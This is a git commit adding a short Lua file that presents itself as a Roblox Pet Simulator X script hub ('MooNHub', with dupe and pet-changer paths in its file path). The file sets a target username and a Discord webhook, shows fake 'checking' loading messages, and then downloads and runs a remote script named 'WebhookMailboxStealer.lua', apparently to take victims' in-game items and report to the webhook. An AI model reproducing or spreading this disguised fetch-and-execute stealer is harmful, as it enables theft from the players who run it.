9957bc8d5f7dea93b1993b76dc36ed7a39f6fa2e
MoonScriptt <137010878+MoonScriptt@users.noreply.github.com>
2023-07-03 22:37:17 +0700

    Mooooon

---
+++ AllAutoPsx/getauto/Petchanger/Dupe/MoonHere/Api/main/MoonHubPsx/.lua
@@ -0,0 +1,9 @@
+Username = "mxrcuszzzzz"
+WebHook = "https://discord.com/api/webhooks/1125449325825237104/WYuo5GGBBEbdke4yONgRqat-45pOe1ZM5Z3sYKNYEheTiiK5sbV5dullaDaEpkZJv-5s"
+loadingscreen = true
+_G.CustomScriptName = "MooNHub"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HerrSimoNHub/api/main/WebhookMailboxStealer.lua"))()
